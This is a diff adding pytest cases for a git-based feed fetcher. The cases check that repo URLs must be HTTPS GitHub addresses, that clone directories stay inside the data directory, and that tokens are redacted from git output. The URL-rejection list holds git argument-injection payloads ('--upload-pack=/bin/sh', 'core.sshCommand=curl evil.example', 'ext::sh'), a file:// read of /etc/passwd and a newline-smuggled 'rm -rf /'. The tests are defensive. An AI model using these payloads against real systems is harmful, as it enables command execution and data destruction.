@@ -779,6 +779,20 @@ def _make_bare_repo(tmp_path: Path) -> Path:
     return bare
 
 
+def _allow_local_repo(monkeypatch, fetcher_cls):
+    """Relax the repo_url policy for the offline git-plumbing tests.
+
+    生产路径只接受 ``https://github.com/...`` (审计 B-6)。但 clone/pull
+    这两条分支本身要能在**本地 bare repo** 上跑 (不联网)。这里显式把
+    校验函数换成"接受本地路径" —— 被测的是 git 调用分支, 不是 URL 策略
+    (URL 策略另有专门用例)。
+    """
+    def _ok(self, repo_url):
+        return (repo_url or "").strip()
+
+    monkeypatch.setattr(fetcher_cls, "_validate_repo_url", _ok)
+
+
 def test_clone_branch_when_no_local_clone(fresh_db, monkeypatch):
     """没有本地 clone → 走 git clone 分支。"""
     from moni.fetch.sources.xbot_feed import FetcherXbotFeed
@@ -786,6 +800,7 @@ def test_clone_branch_when_no_local_clone(fresh_db, monkeypatch):
     data_dir = fresh_db
     bare = _make_bare_repo(fresh_db.parent)
     f = _seeded_fetcher(data_dir, repo_url=str(bare))
+    _allow_local_repo(monkeypatch, FetcherXbotFeed)
 
     clone_root = f._sync_clone(f._load_config())
     assert clone_root is not None
@@ -800,6 +815,7 @@ def test_pull_branch_when_clone_exists(fresh_db, monkeypatch):
     data_dir = fresh_db
     bare = _make_bare_repo(fresh_db.parent)
     f = _seeded_fetcher(data_dir, repo_url=str(bare))
+    _allow_local_repo(monkeypatch, FetcherXbotFeed)
 
     clone_root = f._sync_clone(f._load_config())
     assert clone_root is not None
@@ -841,6 +857,101 @@ def test_git_failure_makes_run_report_error(fresh_db):
     assert "git clone/pull failed" in result["error"]
     assert result["inserted"] == 0
     assert result["fetched"] == 0
+
+
+# ── B-6 / B-7: 注入防护 + 凭据脱敏 ────────────────────────────────────
+
+@pytest.mark.parametrize("bad_url", [
+    "--upload-pack=/bin/sh",
+    "-c core.sshCommand=curl evil.example",
+    "file:///etc/passwd",
+    "ssh://git@github.com/o/r.git",
+    "http://github.com/o/r.git",
+    "ext::sh -c 'touch /tmp/pwn'",
+    "https://evil.example/o/r.git",
+    "https://github.com/o/r.git extra",
+    "https://github.com/o/r.git\nrm -rf /",
+    "",
+])
+def test_repo_url_must_be_https_github(fresh_db, bad_url):
+    """B-6: repo_url 只接受 https://github.com/<owner>/<repo>[.git]。"""
+    from moni.fetch.sources.xbot_feed import FetcherXbotFeed
+
+    f = FetcherXbotFeed()
+    with pytest.raises(ValueError):
+        f._validate_repo_url(bad_url)
+
+
+def test_repo_url_accepts_github_https(fresh_db):
+    from moni.fetch.sources.xbot_feed import FetcherXbotFeed
+
+    f = FetcherXbotFeed()
+    ok = "https://github.com/mariusiaowego-commits/xbot-feed.git"
+    assert f._validate_repo_url(ok) == ok
+    assert f._validate_repo_url("https://github.com/o/r") == "https://github.com/o/r"
+
+
+def test_clone_dir_must_stay_inside_data_dir(fresh_db):
+    """B-6: clone_dir 解析后必须在 moni 数据目录内。"""
+    from moni.fetch.sources.xbot_feed import FetcherXbotFeed
+
+    f = FetcherXbotFeed()
+    data_dir = f._data_dir().resolve()
+
+    # 目录内的相对/绝对路径 → 放行
+    assert f._validate_clone_dir(data_dir / "xbot-feed") == (data_dir / "xbot-feed")
+    assert f._validate_clone_dir(data_dir / "sub" / "dir") == (data_dir / "sub" / "dir")
+
+    # 越界 → 拒绝
+    with pytest.raises(ValueError):
+        f._validate_clone_dir(Path("/etc"))
+    with pytest.raises(ValueError):
+        f._validate_clone_dir(data_dir / ".." / ".." / "escape")
+
+
+def test_sync_clone_rejects_bad_repo_url(fresh_db):
+    """B-6: 校验失败 → _sync_clone 返回 None (fetch() 记 error, 不静默 0 篇)。"""
+    from moni.fetch.sources.xbot_feed import FetcherXbotFeed
+
+    data_dir = fresh_db
+    f = _seeded_fetcher(data_dir, repo_url="--upload-pack=/bin/sh")
+    assert f._sync_clone(f._load_config()) is None
+
+
+def test_sync_clone_rejects_escaping_clone_dir(fresh_db):
+    """B-6: clone_dir 越出数据目录 → 拒绝。"""
+    from moni.fetch.sources.xbot_feed import FetcherXbotFeed
+
+    data_dir = fresh_db
+    f = _seeded_fetcher(data_dir, clone_dir="/tmp/moni-xbot-escape")
+    assert f._sync_clone(f._load_config()) is None
+
+
+@pytest.mark.parametrize("raw,expected_absent", [
+    ("fatal: Authentication failed for 'https://ghp_abc123TOKEN@github.com/o/r.git'",
+     "ghp_abc123TOKEN"),
+    ("fatal: could not read Username for 'https://user:s3cr3t@github.com/o/r.git'",
+     "s3cr3t"),
+    ("remote: Repository not found.\nfatal: Authentication failed for "
+     "'https://tok3n@github.com/o/r.git'", "tok3n"),
+])
+def test_redact_git_output_strips_credentials(raw, expected_absent):
+    """B-7: git 输出里的 user:token@ 必须脱敏。"""
+    from moni.fetch.sources.xbot_feed import _redact_git_output
+
+    out = _redact_git_output(raw)
+    assert expected_absent not in out
+    assert "***@" in out
+    # 路径部分保留
+    assert "github.com/o/r.git" in out
+
+
+def test_redact_git_output_leaves_clean_text_untouched():
+    from moni.fetch.sources.xbot_feed import _redact_git_output
+
+    raw = "fatal: repository 'https://github.com/o/r.git' not found"
+    assert _redact_git_output(raw) == raw
+    assert _redact_git_output("") == ""
 
 
 # ── 回归: 现有源不受影响 ───────────────────────────────────────────────
